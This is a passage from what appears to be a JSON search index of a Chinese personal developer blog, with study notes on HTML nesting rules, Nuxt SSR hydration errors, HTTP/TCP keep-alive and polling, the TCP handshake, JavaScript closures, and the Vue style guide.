extend: {\n         // ...\n         backgroundImage: {\n           \"gradient-61\":\n             \"linear-gradient(184.29deg, rgba(0, 0, 0, 0) 3.48%, rgba(0, 0, 0, 0.8) 96.51%)\",\n         },\n       },\n   ```\n\n   2. 在 vue 中使用\n\n   ```vue\n   <div class=\"bg-gradient-61\" >\n   ```\n","tags":["windicss"],"categories":["workNotes"]},{"title":"html 标签嵌套规则","url":"/workNotes/work/10 xhtml 标签嵌套规则","content":"\n> 由 [nuxtjs 开发 spa](./10 nuxtjs 报错.md) 引申出的思考\n>\n> 参考链接：\n> https://cloud.tencent.com/developer/article/1009200\n>\n> https://cloud.tencent.com/developer/article/1484900\n>\n> https://developer.mozilla.org/zh-CN/docs/Web/Guide/HTML/Content_categories\n\n> 其实第一个参考链接的图片已经讲的很清楚了，那我就大概总结一下吧\n\n1. 块级元素可以嵌套 块级/行内元素\n\n   - 其中 `<h1>～<h6>` `<dt>` 只能嵌套行内元素\n   - 其中 `<p>` 可以嵌套 `<p>` 和 行内元素\n\n2. 行内元素 只可以嵌套行内元素\n\n   - 其中 `<a>` 可以嵌套除了 `<a>` 以外的几乎所有元素，包括行内和块级元素\n\n3. 块级元素 与 块级元素 并列，行内元素 与 行内元素 并列\n\n> 在使用 nuxtjs 配合 vue 开发的时候，报 `[vue warn]`的情况，只有 `<a> <a></a> </a>`，及 a 标签 嵌套 a 标签才会出现，为啥捏？还没有搞懂...\n","tags":["html"],"categories":["workNotes"]},{"title":"nuxtjs 开发 spa 遇上的有关 html 标签规则的报错","url":"/workNotes/work/10 nuxtjs报错","content":"\n> 博客上线前，老大发现的 [vue warn], 说 “博客详情服务器渲染有问题”、“这个在正式环境会执行错误的”、“沙盒应该就会无法渲染”、“ssr 和 spa 渲染结果不一样”...\n>\n> 触发报错的操作: “在博客详情页直接刷新 就会提示我截图的错误”\n\n### 报错信息:\n\n[Vue warn]: The client-side rendered virtual DOM tree is not matching server-rendered content. This is likely caused by incorrect HTML markup, for example nesting block-level elements inside `<p>`, or missing `<tbody>`. Bailing hydration and performing full client-side render.\n\n### 报错截图：\n\n<img src=\"https://s1.ax1x.com/2022/04/20/Ls48OK.png\">\n\n> 大概意思是 HTML 结构嵌套不正确，会导致 srr 渲染的页面跟csr的不一样\n> 根据黄色提示，我很快就定位到了代码的位置\n\n### 报错效果图及其 html 标签:\n\n<img src=\"https://s1.ax1x.com/2022/04/20/LsI3VO.jpg\">\n\n最外层的`<a class=\"pre item\">`\n\n> 本来最外层的 `<a>` 是 `<p>` 的，但是因为里面的两个 `<a>` 标签都是跳转同一个链接，所以我就直接把最外层改了，虽然我记得这样嵌套不行，但是我以为没影响！\n\n> 我不知道为什么上个同学要分开写两个? 难道是因为分开 `hover` 改变样式? 如果有大佬知道分开写的好处, d 我!!! 我很感兴趣!!!\n\n### 报错解决\n\n因为 html 标签嵌套规则里面有提到 `<a>` 标签可以嵌套**除本身以外**的块级元素、行内元素，所以直接把里面的两个 `<a>` 改成其他标签，如 `<span>` 就解决问题啦！\n","tags":["ssr","nuxtjs"],"categories":["workNotes"]},{"title":"HTTP 与 TCP keep-alive 的区别","url":"/furtherNotes/further/01 http tcp keepalive","content":"\n> 根据 连接轮询扩展\n>\n> 参考链接:\n>\n> https://www.jianshu.com/p/95af6727bf6c\n>\n> https://www.jianshu.com/p/cb36364ee099   – 详细\n\n## HTTP keep-alive\n\n>  决定tcp连接是长连接还是短连接\n\n\n\n- HTTP是基于TCP传输协议实现的，**客户端与服务段要进行HTTP连接前，需要先建立TCP连接**，然后客户端发送HTTP请求，服务端收到后就返回响应，至此[请求-应答]完成，随后释放连接。\n\n+ HTTP短连接：每次请求都经历一个建立TCP的连接。一次连接只能请求一次资源。\n\n+ HTTP长连接：HTTP的keepalive实现了这个功能，可以使用同一个TCP连接来发送和接受多个HTTP请求/应答，避免连接建立释放的过程造成的资源消耗\n\n- 特点：只要任意一端没有明确提出断开连接，则保持TCP连接。\n- 为了避免资源浪费的情况，web服务器会提供超时连接的参数，用来指定HTTP长连接的超时时间。\n\n## TCP keep-alive\n\n+ 是由TCP内核层实现的，称为**TCP的保活机制**\n\n+ 定义在一个时间段，在这个时间段内，如果**没有任何连接**的相关活动，**TCP保活机制会开始作用** —— 每隔一个时间段，发送一个探测报文，该探测报文包含的数据非常少，**如果连续几个探测报文都没有得到响应，则认为当前的TCP连接已经死亡**，系统内核将错误信息通知上层应用程序。\n+ 如果对端程序是正常工作的。当TCP保活的探测报文发送给对端，对端会正常响应，这样TCP保活时间会被重置，等待下一个TCP保活时间的到来。\n+ 如果对端程序崩溃，或对端由于其他原因导致报文不可达。当TCP保活的探测报文发送给对端后，石沉大海，没有响应，连续几次，达到保活探测次数后，TCP会报告该TCP连接已死亡。\n\n\n\n","tags":["网络","HTTP","TCP"],"categories":["furtherNotes"]},{"title":"长连接短链接 长轮询短轮询","url":"/furtherNotes/further/01 tcp长短连接轮询","content":"\n> 参考链接：https://www.jianshu.com/p/3fc3646fad80\n\n## 短链接\n\nhttp1.0\n\n每次http连接都要经历：发送请求 -> 建立tcp连接 -> 传输数据 -> 关闭tcp连接\n\n## 长连接\n\nhttp1.1\n\nhttp connection = keep-alive，发送请求 -> 建立tcp长连接 -> 传输所有http请求及其响应数据 -> 在超时时间内 如果没有请求发送的话就断开连接\n\n\n\n> HTTP协议说到底是应用层的协议，而TCP才是真正的传输层协议，只有负责传输的这一层才需要建立连接。\n>\n> 所以长短连接是指 tcp 连接\n\n**Q1** 是不是只要设置Connection为keep-alive就算是长连接了？\n\n**A1** 是的，但要服务器和客户端都设置。\n\n> 都说HTTP1.1默认是长连接，而观察我们平时开发的Web应用的HTTP头部，Connection也确实是keep-alive，那就是说我们大部分都是用的长连接\n\n\n\n**Q2** 我们平时用的是不是长连接？\n\n**A2** 是的。（现在用的基本上都是HTTP1.1协议，你观察一下就会发现，基本上**Connection都是keep-alive**。而且HTTP协议文档上也提到了，HTTP1.1默认是长连接，也就是默认Connection的值就是keep-alive）\n\n\n\n**Q3** 这种普通的Web应用（比如博客园，我的个人博客这种）用长连接有什么好处？需不需要关掉长连接而使用短连接？\n\n**A3**  长连接是为了复用TCP连接，也就是说，长连接情况下，**多个HTTP请求可以**复用同一个TCP连接，这就节省了很多TCP连接建立和断开的消耗。\n\n比如你请求了博客园的一个网页，这个网页里肯定还包含了CSS、JS等等一系列资源，如果你是短连接（也就是每次都要重新建立TCP连接）的话，那**你每打开一个网**页，基本**要建立几个甚至几十个TCP连接**，这浪费了多少资源就不用LZ去说了吧。\n\n但如果是长连接的话，那么这么**多次HTTP请求**（这些请求包括请求网页内容，CSS文件，JS文件，图片等等），其实**使用的都是一个TCP连接**，很显然是可以节省很多消耗的。\n\n长连接并不是永久连接的。如果一段时间内（具体的时间长短，是可以在header当中进行设置的，也就是所谓的**超时时间**），这个**连接没有HTTP请求发出的话，那么这个长连接就会被断掉**。\n\n\n\n> 首先长连接是为了复用，比如说在请求这个博客的时候，建立了一条tcp连接，在传输完一个html文件后，连接就关闭了，如果还有后续的css文件就需要再开启一个tcp连接，but 如果用了长连接，再与改网站有关的资源还没传输完的时候一直保持着改连接，\n\n\n\n## 短轮询\n\n在一个需要实时更新数据的地方，比如说商品库存量:\n\n用JS写个死循环，**不停的去请求服务器中的库存量是多少，然后刷新到这个页面当中**，这其实就是所谓的短轮询。**短轮询去服务端查询的时候，不管库存量有没有变化，服务器就立即返回结果了。**\n\n坏处：那就是你很浪费服务器和客户端的资源，如果有1000个人停留在某个商品详情页面，那就是说会有1000个客户端不停的去请求服务器获取库存量，这显然是不合理的。\n\n> 短轮询就是在不停得向后端发送请求查询库存量，后端每次都返回当前数据库的值给前端\n>\n> 如果在很多用户都看这个页面时，后台就要返回很多数据\n\n\n\n## 长轮询\n\n在一个需要实时更新数据的地方，比如说商品库存量:\n\n其实长轮询和短轮询最大的区别是，短轮询去服务端查询的时候，不管库存量有没有变化，服务器就立即返回结果了。而长轮询则不是，在长轮询中**，服务器如果检测到库存量没有变化的话，将会把当前请求挂起**一段时间（这个时间也叫作**超时时间**，一般是几十秒）。在这个时间里，**服务器会去检测库存量有没有变化，检测到变化就立即返回，否则就一直等到超时为止。**\n\n> 长轮询就是发送一个查询库存量的请求，但是后端是在数据库变化的时候才返回给前端\n\n\n\n## 轮询和连接的区别\n\n1. **决定的方式**，\n\n   一个TCP连接是否为长连接，是通过设置**HTTP的Connection Header**来决定的，而且是需要**两边都设置**才有效。\n\n   而一种轮询方式是否为长轮询，是根据**服务端的处理方式**来决定的，与客户端没有关系。\n\n2. **实现的方式**，\n\n   连接的长短是通过**协议**来规定和实现的。\n\n   而轮询的长短，是**服务器通过编程**的方式手动挂起请求来实现的。\n\n","tags":["网络","HTTP","TCP"],"categories":["furtherNotes"]},{"title":"TCP三次握手、四次挥手","url":"/furtherNotes/further/02 tcp三次握手四次挥手","content":"\n>\n> 参考链接：\n>\n> https://juejin.cn/post/6844904070889603085#heading-1\n>\n> https://juejin.cn/post/6844903625513238541\n\n## 三次握手\n\n#### 为什么要进行三次握手：为了确认对方的发送和接收能力。\n\n#### 主要流程：\n\n<img src=\"https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2018/6/26/1643a1dd6df4813b~tplv-t2oaga2asx-zoom-in-crop-mark:1304:0:0:0.awebp\" style=\"zoom: 40%;float:flet;\" >  \n\n#### 为什么不是两次？\n\n根本原因: 无法确认客户端的接收能力。\t\n\n如果是两次，你现在发了 SYN 报文想握手，但是这个包**滞留**在了当前的网络中迟迟没有到达，TCP 以为这是丢了包，于是重传，两次握手建立好了连接。\n\n看似没有问题，但是连接关闭后，如果这个**滞留**在网路中的包到达了服务端呢？这时候由于是两次握手，服务端只要接收到然后发送相应的数据包，就默认**建立连接**，但是现在客户端已经断开了。\n\n#### 为什么不是四次？\n\n三次握手的目的是确认双方`发送`和`接收`的能力，那四次握手可以嘛？\n\n当然可以，100 次都可以。但为了解决问题，三次就足够了，再多用处就不大了。\n\n#### 三次握手过程中可以携带数据么？\n\n第三次握手的时候，可以携带。前两次握手不能携带数据。\n\n如果前两次握手能够携带数据，**那么一旦有人想攻击服务器，那么他只需要在第一次握手中的 SYN 报文中放大量数据，那么服务器势必会消耗更多的时间和内存空间去处理这些数据**，增大了服务器被攻击的风险。\n\n第三次握手的时候，客户端已经处于`ESTABLISHED`状态，并且已经能够确认服务器的接收、发送能力正常，这个时候相对安全了，可以携带数据。\n\n#### 同时打开会怎样？\n\n如果双方同时发 `SYN`报文，状态变化会是怎样的呢？\n\n在发送方给接收方发`SYN`报文的同时，接收方也给发送方发`SYN`报文，两个人刚上了!\n\n发完`SYN`，两者的状态都变为`SYN-SENT`。\n\n在各自收到对方的`SYN`后，两者状态都变为`SYN-REVD`。\n\n接着会回复对应的`ACK + SYN`，这个报文在对方接收之后，两者状态一起变为`ESTABLISHED`。\n\n这就是同时打开情况下的状态变迁。\n\n\n\n\n## 四次挥手\n\n<img src=\"https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2018/6/26/1643a20296de1ff0~tplv-t2oaga2asx-zoom-in-crop-mark:1304:0:0:0.awebp\" style=\"zoom:40%;\" >\t\n\n#### 等待2MSL的意义\n\n如果不等待，客户端直接跑路，当**服务端还有很多数据包要给客户端发**，且还在路上的时候，若客户端的端口此时刚好被新的应用占用，那么就接收到了无用数据包，造成数据包混乱。所以，**最保险的做法是等服务器发来的数据包都死翘翘再启动新的应用。**\n\n- 1 个 MSL 确保四次挥手中**主动关闭方最后的 ACK 报文最终能达到对端**\n- 1 个 MSL 确保**对端没有收到 ACK 重传的 FIN 报文可以到达**\n\n这就是等待 2MSL 的意义。\n\n#### 为什么是四次挥手而不是三次？\n\n因为服务端在接收到`FIN`, 往往不会立即返回`FIN`, **必须等到服务端所有的报文都发送完毕了，才能发`FIN`**。因此先发一个`ACK`表示已经收到客户端的`FIN`，延迟一段时间才发`FIN`。这就造成了四次挥手。\n\n如果是三次挥手会有什么问题？\n\n等于**说服务端将`ACK`和`FIN`的发送合并为一次挥手**，这个时候**长时间的延迟**可能会导致客户端误以为`FIN`没有到达客户端，从而让客户端不断的重发`FIN`\n\n#### 同时关闭会怎样？\n\n<img src=\"https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/2/23/170723edeb9e8003~tplv-t2oaga2asx-zoom-in-crop-mark:1304:0:0:0.awebp\" style=\"zoom:67%;\" >","tags":["网络","TCP"],"categories":["furtherNotes"]},{"title":"浅浅了解闭包","url":"/workNotes/work/09 闭包","content":"\n> 2022.03.02 周三\n>\n> 参考链接：https://github.com/lgwebdream/FE-Interview/issues/17\n\n\n## 对闭包的看法，为什么要用闭包？说一下闭包原理以及应用场景\n\n### 闭包是什么？\n\n函数执行后返回结果是一个内部函数，并被外部变量所引用，如果内部函数持有被执行函数作用域的变量，就形成了闭包。\n\n> 简而言之：可以在内部函数访问到外部函数的作用域。\n\n使用闭包的作用：\n\n1. 读取函数中的变量\n2. 将函数中的变量存储在内存中，保护变量不被污染。\n   > 因此，会对内存有消耗，所以不可以滥用闭包，否则会影响网页性能，造成内存泄漏。\n   > 在不需要使用闭包时，要及时释放内存，可以将内层函数对象的变量赋值为 null\n\n### 闭包原理\n\n函数执行分成两个阶段：预编译阶段 和 执行阶段\n\n1. 预编译阶段，如果发现内部函数使用了外部函数的变量，则会在内存中创建一个“闭包”对象并保存对应变量，如果已存在“闭包”，就只需要增加对应的属性值即可。\n2. 执行完后，函数执行上下文会被销毁，函数对“闭包”对象的引用也会被销毁，但内部函数还持有该“闭包”的引用，所以内部函数可以继续使用外部函数中的变量\n\n> 利用函数作用域链的特性，一个函数**内部定义的函数** 会将包含的 **外部函数的活动对象** 添加到它的作用域中，函数执行完毕，其函数执行作用域链销毁；但因为 **内部函数的作用域链** 仍然**在引用**这个活动对象，所以其活动对象不会被销毁，直至内部函数被销毁后才被销毁。\n\n### 优点\n\n- 可以从内部函数访问外部函数的作用域中的变量，且访问到的变量长期存储在内存中，可供后面使用\n- 避免变量污染全局\n- 把变量存在独立的作用域，作为私有成员存在\n\n### 缺点\n\n- 对内存消耗有负面影响，因内部函数保存了对外部变量的引用，导致无法被垃圾回收，增大内存使用量，所以使用不当会导致内存泄漏。\n- 对处理速度具有负面影响。闭包的层级决定了引用的外部变量在查找时经过的作用域链的长度\n- 可能获取到意外的值 captured value\n\n### 应用场景\n\n1. 模块封装；在各模块规范出现之前，都是用这样的方式防止变量污染全局\n\n```js\nvar bar = function () {\n  var foo = 0;\n  function bar() {}\n  bar.prototype.ddd = function ddd() {\n    return foo;\n  };\n  return bar;\n};\n```\n\n2. 在循环中创建闭包，防止取到意外的值\n\n```js\nfunction foo(num){\n  return function(){\n    console.log(num);\n  }\n}\n\nfor(var i = 0 ; i < 3 ; i++>){\n  foo(i);\n}\n```\n","tags":["js","闭包"],"categories":["workNotes"]},{"title":"关于 v-html 内样式不生效","url":"/workNotes/work/07 v-html 样式不生效","content":"\n> free-vpn 读取$t 里面的内容 作为 html 其中有个 a 标签有其他样式\n> 参考链接 https://cloud.tencent.com/developer/article/1485232\n\n关于 v-html\n\n> 在 vue 使用中，指令 v-html 渲染页面经常用到，类似于 jQuery 的$('x').html( )去渲染。通过指令 v-html 渲染出来的内容还会带有原来的标签及其样式，如果需要修改或者重设其样式，应该如何去做呢？\n\n- 采坑\n     首先，我在 style 中用子级选择器去选中并修改样式，经过猛如虎的操作后，并没生效。F12 打开 Elements 调试，发现在 style 里面样式根本没加载上去，没有 class 中也没有类名出现。除此之外，渲染非该指令元素时，所有的类名会跟有 [data-v-xxxxxx]的东西。\n\n- 排坑\n  - 去掉 style 中的 scoped;\n  - watch 监测数据变化;\n  - 深度选择器 >>>\n\n1.  在 vue 组件中，我们写 style 时，为了防止页面样式冲突，在每个组件中会加上 scoped 属性。经测试，去掉该属性即可渲染样式成功。但是在组件过多或者项目中大时，经常会出现页面样式冲突，因此该方法不建议使用。\n2.  在 script>exportdefault 中,watch 属性可监听 v-html 所绑定值的变化。如果是后台请求的数据，那么可以在 watch 中监听改数据变化，当数据发生改变驱动视图后，动态绑定一个 class 来改变子级元素样式。此方法有一定局限性。\n3.  深度选择器 >>>，可深度改变子级样式\n\n```html\n<style scoped>\n  .test >>> * {\n    width: 100%;\n  }\n</style>\n\n<!-- 如果使用 scss或者 less等css扩展语言，则用 /deep/替代 -->\n\n<style scoped type=\"text/scss\" lang=\"scss\">\n  .test {\n    /deep/ * {\n      width: 100%;\n    }\n  }\n</style>\n```\n\nscoped 属性导致 css 仅对当前组件生效，而 html 绑定渲染出的内容可以理解为是子组件的内容，一般情况下子组件不会被加上对应的属性，所以不会应用带有 scoped 的 css。\n","tags":["vue"],"categories":["workNotes"]},{"title":"vue 一些注意的问题","url":"/workNotes/work/06 vue 问题","content":"\n# vue 一些注意的问题\n> 参考 官方文档\n\n1. v-if 与 v-show\n    v-if 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。\n\n    v-if 也是惰性的：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。\n\n    相比之下，v-show 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。\n\n    一般来说，**v-if 有更高的切换开销，而 v-show 有更高的初始渲染开**销。因此，如果需要非常频繁地切换，则使用 v-show 较好；如果在运行时条件很少改变，则使用 v-if 较好。\n\n2. 避免 v-if 与 v-for 一起使用\n    v-for 优先级比 v-if 高，多了不必要的开销\n\n3. v-for 中的 in 可以被 of 替代，它更接近 JavaScript 迭代器的语法； \n    v-for 中的参数依次为(item, keyname, value);\n    不要使用对象或数组之类的非基本类型值作为 v-for 的 key。请用字符串或数值类型的值。\n\n4. 数组更新检测\n    Vue 将被侦听的数组的变更方法进行了包裹，所以它们也将会触发视图更新。这些被包裹过的方法包括：\n    `push() pop() shift() unshift() splice() sort() reverse()`\n\n5. @click=\"handle($event)\" 在内联语句处理器中访问原始的 DOM 事件\n\n6. v-model \n~~~html\n<input v-model=\"searchText\">\n<!-- 等价于 -->\n\n<input\n  v-bind:value=\"searchText\"\n  v-on:input=\"searchText = $event.target.value\"\n>\n~~~\n    v-model 在内部为不同的输入元素使用不同的 property 并抛出不同的事件：\n    + text 和 textarea 元素使用 value property 和 input 事件；\n    + checkbox 和 radio 使用 checked property 和 change 事件；\n    + select 字段将 value 作为 prop 并将 change 作为事件。\n\n7. 一个组件的data必须是 函数\n    一个组件的 data 选项必须是一个函数，因此每个实例可以维护一份被返回对象的独立的拷贝\n\n8. 注册组件\n~~~js\n// 全局注册\nVue.component('component-a', { /* ... */ })\nVue.component('component-b', { /* ... */ })\nVue.component('component-c', { /* ... */ })\n\nnew Vue({ el: '#app' })\n\n// 局部注册\n\nvar ComponentA = { /* ... */ }\nvar ComponentB = { /* ... */ }\nvar ComponentC = { /* ... */ }\n\nnew Vue({\n  el: '#app',\n  components: {\n    'component-a': ComponentA,\n    'component-b': ComponentB\n  }\n})\n~~~\n\n9. prop 的写法\n    在js中:`props:[postTitle]`;\n    在html中:`<blog-post post-title=\"hello!\"></blog-post>`\n\n10. prop 可以通过 v-bind 动态赋值\n~~~html\n<blog-post v-bind:title=\"post.title\"></blog-post>\n~~~\n\n11. 单项数据流\n    所有的 prop 都使得其父子 prop 之间形成了一个单向下行绑定：父级 prop 的更新会向下流动到子组件中，但是反过来则不行。这样会防止从子组件意外变更父级组件的状态，从而导致你的应用的数据流向难以理解。\n\n    额外的，每次父级组件发生变更时，子组件中所有的 prop 都将会刷新为最新的值。这意味着你不应该在一个子组件内部改变 prop。如果你这样做了，Vue 会在浏览器的控制台中发出警告。","tags":["vue"],"categories":["workNotes"]},{"title":"vue风格指南","url":"/workNotes/work/05 vue 风格指南","content":"\n## 优先级A\n\n### 组件名为多个单词\n\n这样做可以避免跟现有的以及未来的 HTML 元素相冲突，因为所有的 HTML 元素名称都是单个单词的。\n\n### 组件数据必为函数\n当在组件中使用 data property 的时候 (除了 new Vue 外的任何地方)，它的值必须是返回一个对象的函数。\n> 当 data 的值是一个对象时，它会在这个组件的所有实例之间共享。当组件被重用时，因为每个组件的实例都引用了相同的数据对象，更改其中一个对象就是改变到其他使用到该组件的数据\n\n我们希望每个组件实例都管理其自己的数据。为了做到这一点，每个实例必须生成一个独立的数据对象。在 JavaScript 中，在一个函数中返回这个对象就可以了。\n\n### prop 定义应该尽量详细\n\n至少要指定数据类型\n> 细致的 prop 定义有两个好处：\n>\n> 它们写明了组件的 API，所以很容易看懂组件的用法；\n>\n> 在开发环境下，如果向一个组件提供格式不正确的 prop，Vue 将会告警，以帮助你捕获潜在的错误来源。\n\n### v-for 设置 key\n\n以便维护内部组件及其子树的状态。\n\n### 避免 v-if 和 v-for 一起使用\n\n当 Vue 处理指令时，v-for 比 v-if 具有更高的优先级。\n所以当用在一个元素的时候，会先把所有元素遍历渲染出来，在看v-if哪些是不用渲染的\n\n### 为组件样式设置作用域\n顶级 App 组件和布局组件中的样式可以是全局的，但是其它所有组件都应该是有作用域的\n\n> 这条规则只和单文件组件有关。你不一定要使用 scoped attribute。设置作用域也可以通过 CSS Modules，那是一个基于 class 的类似 BEM 的策略，当然你也可以使用其它的库或约定。\n>\n> 不管怎样，对于组件库，我们应该更倾向于选用基于 class 的策略而不是 scoped attribute。\n>\n> 这让覆写内部样式更容易：使用了常人可理解的 class 名称且没有太高的选择器优先级，而且不太会导致冲突。\n\n\nVue 使用 _ 前缀来定义其自身的私有 property，所以使用相同的前缀 (比如 _update) 有覆写实例 property 的风险。即便你检查确认 Vue 当前版本没有用到这个 property 名，也不能保证和将来的版本没有冲突。\n对于 $ 前缀来说，其在 Vue 生态系统中的目的是暴露给用户的一个特殊的实例 property，所以把它用于私有 property 并不合适。\n不过，我们推荐把这两个前缀结合为 $_，作为一个用户定义的私有 property 的约定，以确保不会和 Vue 自身相冲突。\n\n##  优先级B\n### 组件文件\n### 单文件组件文件名称\n\n单文件组件的文件名应该要么始终是单词大写开头 (PascalCase)，要么始终是横线连接 (kebab-case)。\n> 单词大写开头对于代码编辑器的自动补全最为友好，因为这使得我们在 JS(X) 和模板中引用组件的方式尽可能的一致。然而，混用文件命名方式有的时候会导致大小写不敏感的文件系统的问题，这也是横线连接命名同样完全可取的原因。\n\n### 基础组件名\n应用特定样式和约定的基础组件 (也就是展示类的、无逻辑的或无状态的组件) 应该全部以一个特定的前缀开头，比如 Base、App 或 V\n\n### 单例组件名 The\n只应该拥有单个活跃实例的组件应该以 The 前缀命名，以示其唯一性\n\n这不意味着组件只可用于一个单页面，而是每个页面只使用一次。这些组件永远不接受任何 prop，因为它们是为你的应用定制的，而不是它们在你的应用中的上下文。如果你发现有必要添加 prop，那就表明这实际上是一个可复用的组件，只是目前在每个页面里只使用一次。\n\n### 紧密耦合的组件名\n和父组件紧密耦合的子组件应该以父组件名作为前缀命名\n\n### 自闭合组件\n组件名中的单词顺序在单文件组件、字符串模板和 JSX 中没有内容的组件应该是自闭合的——但在 DOM 模板里永远不要这样做。\n\n自闭合组件表示它们不仅没有内容，而且刻意没有内容。其不同之处就好像书上的一页白纸对比贴有“本页有意留白”标签的白纸。而且没有了额外的闭合标签，你的代码也更简洁。\n\n不幸的是，HTML 并不支持自闭合的自定义元素——只有官方的“空”元素。所以上述策略仅适用于进入 DOM 之前 Vue 的模板编译器能够触达的地方，然后再产出符合 DOM 规范的 HTML。\n组件名应该以高级别的 (通常是一般化描述的) 单词开头，以描述性的修饰词结尾。\n\n~~~html\n<!-- 在单文件组件、字符串模板和 JSX 中 -->\n<MyComponent/>\n<!-- 在 DOM 模板中 -->\n<my-component></my-component>\n~~~\n\n### 模版中的组件名大小写\n对于绝大多数项目来说，在单文件组件和字符串模板中组件名应该总是 PascalCase 的——但是在 DOM 模板中总是 kebab-case 的。\n\n>PascalCase 相比 kebab-case 有一些优势：\n\n> 编辑器可以在模板里自动补全组件名，因为 PascalCase 同样适用于 JavaScript。\n> `<MyComponent>` 视觉上比 `<my-component>` 更能够和单个单词的 HTML 元素区别开来，因为前者的不同之处有两个大写字母，后者只有一个横线。\n> 如果你在模板中使用任何非 Vue 的自定义元素，比如一个 Web Component，PascalCase 确保了你的 Vue 组件在视觉上仍然是易识别的。\n> 不幸的是，由于 HTML 是大小写不敏感的，在 DOM 模板中必须仍使用 kebab-case。\n\n~~~html\n<!-- 在单文件组件和字符串模板中 -->\n<MyComponent/>\n<!-- 在 DOM 模板中 -->\n<my-component></my-component>\n\n<!-- or 在所有地方 -->\n<my-component></my-component>\n~~~\n\n### js/jsx 中组件名大小写\nJS/JSX 中的组件名应该始终是 PascalCase 的，尽管在较为简单的应用中只使用 Vue.component 进行全局组件注册时，可以使用 kebab-case 字符串。\n\n~~~js\nVue.component('MyComponent', {\n  // ...\n})\nVue.component('my-component', {\n  // ...\n})\nimport MyComponent from './MyComponent.vue'\nexport default {\n  name: 'MyComponent',\n  // ...\n}\n~~~\n\n### 完整单词组件名\n组件名应该倾向于完整单词而不是缩写。\n\n编辑器中的自动补全已经让书写长命名的代价非常之低了，而其带来的明确性却是非常宝贵的。不常用的缩写尤其应该避免。\n\n\n### prop名 大小写 \n在声明 prop 的时候，其命名应该始终使用 camelCase，而在模板和 JSX 中应该始终使用 kebab-case。\n\n**我们单纯的遵循每个语言的约定。在 JavaScript 中更自然的是 camelCase。而在 HTML 中则是 kebab-case。**\n\n\n### 多 attr 元素\n多个 attribute 的元素应该分多行撰写，每个 attribute 一行。\n\n在 JavaScript 中，用多行分隔对象的多个 property 是很常见的最佳实践，因为这样更易读。模板和 JSX 值得我们做相同的考虑。\n\n\n### 模版中简单表达式\n组件模板应该只包含简单的表达式，复杂的表达式则应该重构为计算属性或方法。\n\n复杂表达式会让你的模板变得不那么声明式。我们应该尽量描述应该出现的是什么，而非如何计算那个值。而且计算属性和方法使得代码可以重用。\n\n### 简单计算属性\n应该把复杂计算属性分割为尽可能多的更简单的 property。\n\n> 易于测试、易于阅读、更好的“拥抱变化”\n\n### 带引号的 attr 值\n非空 HTML attribute 值应该始终带引号 (单引号或双引号，选你 JS 里不用的那个)。\n\n在 HTML 中不带空格的 attribute 值是可以没有引号的，但这鼓励了大家在特征值里不写空格，导致可读性变差。\n\n### 指令缩写\n指令缩写 (用 : 表示 v-bind:、用 @ 表示 v-on: 和用 # 表示 v-slot:) 应该要么都用要么都不用。\n\n## 优先级 C\n### 组件/实例的选项顺序\n推荐\n1. 副作用 - 触发组件外的影响\n    + el\n2. 全局感知 - 要求组件外的知识\n    + name\n    + parent\n3. 组件类型 - 更改组件类型\n    + functional\n4. 模版修改器 - 改变模版的编译方式\n    + delimiters\n    + comments\n5. 模版依赖 - 模版内使用的资源\n    + components\n    + directives\n    + filters\n6. 组合 - 向选项里合并 property\n    + extends\n    + mixins\n7. 接口 - 组件接口\n    + inheritAttrs\n    + model\n    + props/propsData\n8. 本地状态 - 本地响应式 property\n    + data\n    + computed\n9. 事件 - 通过响应式事件触发的回调函数\n    + watch\n    + 生命周期钩子\n10. 非响应式的 property - 不依赖响应式系统的 property\n    + methods\n11. 渲染 - 组件输出声明描述\n    + template/render\n    + renderError\n\n### 元素 attr 顺序\n1. 定义 - 提供组件的选项\n    + is\n2. 列表渲染\n    + v-for\n3. 条件渲染\n    + v-if\n    + v-else-if\n    + v-else\n    + v-show\n    + v-cloak\n4. 渲染方式\n    + v-pre\n    + v-once\n5. 全局感知 - 需要超越组件的知识\n    + id\n6. 唯一的attr\n    + ref\n    + key\n7. 双向绑定\n    + v-model\n8. 其他 attr - 所有普通的绑定或未绑定的 attr\n9. 事件\n    + v-on\n10. 内容\n    + v-html\n    + v-text\n\n### 组件/实例选项中的空行\n你可能想在多个 property 之间增加一个空行，特别是在这些选项一屏放不下，需要滚动才能都看到的时候。\n\n当你的组件开始觉得密集或难以阅读时，在多个 property 之间添加空行可以让其变得容易。在一些诸如 Vim 的编辑器里，这样格式化后的选项还能通过键盘被快速导航。\n\n### 单文件组件的顶级元素的顺序\n单文件组件应该总是让 `<script>`、`<template>` 和 `<style>` 标签的顺序保持一致。且 `<style>` 要放在最后，因为另外两个标签至少要有一个。\n\n## 优先级D 谨慎使用\n\n### 不在 v-if/v-else-if/v-else ➕ key\n如果一组 v-if + v-else 的元素类型相同，最好使用 key (比如两个 <div> 元素)。\n\n默认情况下，Vue 会尽可能高效的更新 DOM。这意味着其在相同类型的元素之间切换时，会修补已存在的元素，而不是将旧的元素移除然后在同一位置添加一个新元素。如果本不相同的元素被识别为相同，则会出现意料之外的结果。\n\n\n### scoped 避免出现元素选择器\n在 scoped 样式中，类选择器比元素选择器更好，因为大量使用元素选择器是很慢的。\n\n\n### 隐性父子组件通信\n应该优先通过 prop 和事件进行父子组件之间的通信，而不是 this.$parent 或变更 prop。\n\n一个理想的 Vue 应用是 prop 向下传递，事件向上传递的。遵循这一约定会让你的组件更易于理解。然而，在一些边界情况下 prop 的变更或 this.$parent 能够简化两个深度耦合的组件。\n\n问题在于，这种做法在很多简单的场景下可能会更方便。但请当心，不要为了一时方便 (少写代码) 而牺牲数据流向的简洁性 (易于理解)。\n\n### 非 flux 的全局状态管理\n应该优先通过 Vuex 管理全局状态，而不是通过 this.$root 或一个全局事件总线。\n\n通过 this.$root 和/或全局事件总线管理状态在很多简单的情况下都是很方便的，但是并不适用于绝大多数的应用。\n\nVuex 是 Vue 的官方类 flux 实现，其提供的不仅是一个管理状态的中心区域，还是组织、追踪和调试状态变更的好工具。它很好地集成在了 Vue 生态系统之中 (包括完整的 Vue DevTools 支持)。\n\n","tags":["vue"],"categories":["workNotes"]},{"title":"nuxtjs 的生命周期","url":"/workNotes/work/04 nuxtjs 